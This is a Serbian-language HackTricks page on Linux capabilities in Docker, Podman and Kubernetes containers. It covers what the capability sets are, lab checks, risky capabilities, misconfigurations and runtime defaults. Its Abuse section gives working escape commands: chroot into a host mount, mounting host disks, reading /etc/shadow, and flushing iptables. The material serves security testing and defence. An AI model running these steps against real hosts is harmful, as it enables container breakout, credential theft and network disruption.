# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

Linux capabilities su jedan od najvažnijih delova container security-ja jer odgovaraju na suptilno, ali fundamentalno pitanje: **šta "root" zaista znači unutar containera?** Na uobičajenom Linux sistemu, UID 0 je istorijski podrazumevao veoma širok skup privilegija. U modernim kernelima, ta privilegija je razložena na manje jedinice koje se nazivaju capabilities. Proces može raditi kao root, a da i dalje nema mnoge moćne operacije ako su relevantne capabilities uklonjene.

Containers se u velikoj meri oslanjaju na ovu razliku. Mnogi workload-ovi se i dalje pokreću kao UID 0 unutar containera zbog kompatibilnosti ili jednostavnosti. Bez uklanjanja capabilities, to bi bilo previše opasno. Sa uklonjenim capabilities, root proces unutar containera i dalje može obavljati mnoge uobičajene zadatke unutar containera, dok mu se uskraćuju osetljivije kernel operacije. Zato shell u containeru koji prikazuje `uid=0(root)` ne znači automatski "host root", pa čak ni "široke kernel privilegije". Skup capabilities određuje koliko ta root identifikacija zaista vredi.

Za potpune reference o Linux capabilities i mnoge primere zloupotrebe, pogledajte:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Operation

Capabilities se prate u nekoliko skupova, uključujući permitted, effective, inheritable, ambient i bounding sets. Kod mnogih procena containera, precizna kernel semantika svakog skupa je manje neposredno važna od praktičnog pitanja: **koje privilegovane operacije ovaj proces trenutno može uspešno da izvrši i koji budući načini za sticanje privilegija su još uvek mogući?**

Ovo je važno zato što su mnoge breakout tehnike zapravo problemi sa capabilities koji su prikriveni kao problemi sa containerima. Workload sa `CAP_SYS_ADMIN` može doći do ogromnog dela kernel funkcionalnosti koju normalan root proces u containeru ne bi trebalo da koristi. Workload sa `CAP_NET_ADMIN` postaje mnogo opasniji ako deli host network namespace. Workload sa `CAP_SYS_PTRACE` postaje mnogo interesantniji ako može da vidi host procese kroz deljenje host PID namespace-a. U Docker-u ili Podman-u to se može pojaviti kao `--pid=host`; u Kubernetes-u se obično pojavljuje kao `hostPID: true`.

Drugim rečima, skup capabilities ne može da se procenjuje izolovano. Mora se posmatrati zajedno sa namespaces, seccomp i MAC policy-jem.

## Lab

Veoma direktan način za proveru capabilities unutar containera je:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Možete takođe uporediti restriktivniji container sa onim kojem su dodate sve capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Da biste videli efekat ograničenog dodavanja, pokušajte da uklonite sve i zatim vratite samo jednu capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ovi mali eksperimenti pomažu da pokažu da runtime ne uključuje i ne isključuje jednostavno boolean pod nazivom "privileged". On oblikuje stvarnu površinu privilegija dostupnu procesu.

## Capabilities visokog rizika

Iako mnoge capabilities mogu biti važne u zavisnosti od cilja, nekoliko njih se iznova pokazuje relevantnim u analizi container escape-a.

**`CAP_SYS_ADMIN`** je capability prema kojoj bi defenders trebalo da budu najoprezniji. Često se opisuje kao "novi root" jer otključava ogroman broj funkcionalnosti, uključujući operacije povezane sa mount-ovima, ponašanje osetljivo na namespace-ove i mnoge kernel putanje koje nikada ne bi trebalo nepromišljeno izložiti container-ima. Ako container ima `CAP_SYS_ADMIN`, slab seccomp i nema snažnu MAC izolaciju, mnoge klasične breakout putanje postaju znatno realnije.

**`CAP_SYS_PTRACE`** je važan kada postoji vidljivost procesa, naročito ako se PID namespace deli sa host-om ili sa interesantnim susednim workload-ovima. Može pretvoriti vidljivost u tampering.

**`CAP_NET_ADMIN`** i **`CAP_NET_RAW`** važni su u okruženjima usmerenim na mrežu. Na izolovanoj bridge mreži već mogu predstavljati rizik; u deljenom host network namespace-u mnogo su opasniji jer workload možda može da rekonfiguriše host networking, vrši sniffing, spoofing ili ometa lokalne tokove saobraćaja.

**`CAP_SYS_MODULE`** je obično katastrofalan u rootful okruženju jer je učitavanje kernel modula praktično kontrola nad host kernel-om. Gotovo nikada ne bi trebalo da se pojavi u container workload-u opšte namene.

## Upotreba runtime-a

Docker, Podman, stack-ovi zasnovani na containerd-u i CRI-O koriste kontrole capabilities, ali se podrazumevane vrednosti i interfejsi za upravljanje razlikuju. Docker ih izlaže direktno kroz flagove kao što su `--cap-drop` i `--cap-add`. Podman izlaže slične kontrole i često dodatno koristi rootless izvršavanje kao bezbednosni sloj. Kubernetes izlaže dodavanje i uklanjanje capabilities kroz `securityContext` Pod-a ili container-a. System-container okruženja kao što su LXC/Incus takođe se oslanjaju na kontrolu capabilities, ali šira integracija tih sistema sa host-om često navodi operatere da agresivnije opuštaju podrazumevane postavke nego što bi to činili u app-container okruženju.

Isti princip važi za sve njih: capability koju je tehnički moguće dodeliti nije nužno capability koju bi trebalo dodeliti. Mnogi incidenti iz stvarnog sveta počinju kada operator doda capability samo zato što workload nije radio pod strožom konfiguracijom, a timu je bilo potrebno brzo rešenje.

## Pogrešne konfiguracije

Najočiglednija greška je **`--cap-add=ALL`** u Docker/Podman-style CLI-jima, ali to nije jedina greška. U praksi je češći problem dodeljivanje jedne ili dve izuzetno moćne capabilities, naročito `CAP_SYS_ADMIN`, da bi se "omogućio rad aplikacije", bez razumevanja posledica po namespace-ove, seccomp i mount-ove. Još jedan čest failure mode jeste kombinovanje dodatnih capabilities sa deljenjem host namespace-ova. U Docker-u ili Podman-u to može izgledati kao `--pid=host`, `--network=host` ili `--userns=host`; u Kubernetes-u se ekvivalentna izloženost obično pojavljuje kroz workload postavke kao što su `hostPID: true` ili `hostNetwork: true`. Svaka od tih kombinacija menja ono na šta capability zapravo može da utiče.

Takođe je uobičajeno da administratori veruju da je workload i dalje značajno ograničen zato što nije u potpunosti `--privileged`. Ponekad je to tačno, ali ponekad je efektivni posture već dovoljno blizu privileged stanju da ta razlika operativno prestaje da bude važna.

## Abuse

Prvi praktični korak jeste enumeracija efektivnog skupa capabilities i neposredno testiranje capability-specific radnji koje bi bile važne za escape ili pristup informacijama sa host-a:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Ako je `CAP_SYS_ADMIN` prisutan, prvo testirajte zloupotrebu zasnovanu na `mount`-u i pristup host filesystem-u, jer je to jedan od najčešćih breakout enabler-a:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Ako je `CAP_SYS_PTRACE` prisutan i kontejner može da vidi zanimljive procese, proverite da li se ova capability može iskoristiti za pregled procesa:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Ako je prisutan `CAP_NET_ADMIN` ili `CAP_NET_RAW`, testirajte da li workload može da manipuliše vidljivim mrežnim stekom ili barem da prikuplja korisne mrežne informacije:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Kada test capability-ja uspe, kombinujte ga sa situacijom u namespace-u. Capability koji deluje samo rizično u izolovanom namespace-u može odmah postati escape ili host-recon primitive kada container takođe deli host PID, host network ili host mounts.

### Potpun primer: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Ako container ima `CAP_SYS_ADMIN` i writable bind mount host filesystem-a, kao što je `/host`, putanja do escape-a je često jednostavna:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Ako `chroot` uspe, komande se sada izvršavaju u kontekstu root filesystem-a hosta:
```bash
id
hostname
cat /etc/shadow | head
```
Ako `chroot` nije dostupan, isti rezultat se često može postići pozivanjem binarne datoteke kroz montirano stablo:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Kompletan primer: `CAP_SYS_ADMIN` + pristup uređaju

Ako je blok uređaj sa hosta izložen, `CAP_SYS_ADMIN` može da omogući direktan pristup host fajl sistemu:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Potpun primer: `CAP_NET_ADMIN` + Mreža hosta

Ova kombinacija ne dovodi uvek direktno do root privilegija na hostu, ali može u potpunosti da rekonfiguriše mrežni stek hosta:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
To može omogućiti denial of service, presretanje saobraćaja ili pristup servisima koji su prethodno bili filtrirani.

## Provere

Cilj provera capabilities nije samo ispisivanje sirovih vrednosti, već razumevanje da li proces ima dovoljno privilegija da njegovo trenutno stanje namespace-a i mount-a bude opasno.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Šta je ovde interesantno:

- `capsh --print` je najlakši način da uočite capabilities visokog rizika, kao što su `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ili `cap_sys_module`.
- Linija `CapEff` u `/proc/self/status` pokazuje šta je trenutno zaista efektivno, a ne samo šta bi moglo biti dostupno u drugim skupovima.
- Dump capabilities postaje mnogo važniji ako container takođe deli host PID, network ili user namespaces, ili ima writable host mounts.

Nakon prikupljanja sirovih informacija o capabilities, sledeći korak je njihovo tumačenje. Proverite da li je proces root, da li su user namespaces aktivni, da li se host namespaces dele, da li seccomp enforcing i dalje primenjuje ograničenja i da li AppArmor ili SELinux još uvek ograničavaju proces. Sam skup capabilities predstavlja samo deo priče, ali je često upravo on razlog zbog kog jedan container breakout uspeva, dok drugi ne uspeva sa istom prividnom početnom tačkom.

## Podrazumevane vrednosti runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Smanjen skup capabilities po podrazumevanim vrednostima | Docker zadržava podrazumevanu allowlist capabilities i uklanja ostale | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Smanjen skup capabilities po podrazumevanim vrednostima | Podman container-i su po podrazumevanim vrednostima unprivileged i koriste smanjen model capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Nasleđuje podrazumevane vrednosti runtime-a ako se ne promene | Ako nije naveden nijedan `securityContext.capabilities`, container dobija podrazumevani skup capabilities od runtime-a | `securityContext.capabilities.add`, izostavljanje `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Obično podrazumevane vrednosti runtime-a | Efektivni skup zavisi od runtime-a i Pod spec-a | isto kao u redu za Kubernetes; direktna OCI/CRI konfiguracija takođe može eksplicitno da doda capabilities |

Za Kubernetes je važno to što API ne definiše jedan univerzalni podrazumevani skup capabilities. Ako Pod ne dodaje niti uklanja capabilities, workload nasleđuje podrazumevane vrednosti runtime-a za taj node.
{{#include ../../../../banners/hacktricks-training.md}}
